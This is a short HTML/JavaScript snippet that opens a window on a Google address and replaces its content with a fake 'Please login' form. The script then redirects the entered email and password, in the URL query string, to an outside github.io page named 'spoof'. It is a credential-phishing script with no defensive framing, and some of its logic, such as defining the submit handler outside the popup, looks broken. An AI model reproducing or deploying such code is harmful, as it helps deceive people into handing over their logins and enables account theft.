<script>
function go() {
    var x = window.open('https://www.google.com/csi'); // Open a target URL
    setTimeout(function() {
        // Change the body content of the opened window to simulate a fake login page
        x.document.body.innerHTML = '<img src="data:image/png;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wB..." />'; // Placeholder image
        x.document.body.innerHTML += '<h1>Please login</h1>';
        x.document.body.innerHTML += 'Email: <input id="email"><br>';
        x.document.body.innerHTML += 'Pass: <input id="pass" type="password"><br>';
        x.document.body.innerHTML += '<button onclick="sendData()">Login</button>';

        // Function to send the collected data to the custom server or redirect to response page
        function sendData() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('pass').value;

            // Check if both email and password are filled
            if (email === "" || password === "") {
                alert("Please enter both email and password.");
                return; // Prevent sending empty data
            }

            // Redirect to response page with data (query string)
window.location.href = `https://ecdnts-del.github.io/spoof/respon.html?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;

        }
    }, 3000); // Wait for 3 seconds to simulate the page load time
}
</script>
<button onclick="go()">Go</button>
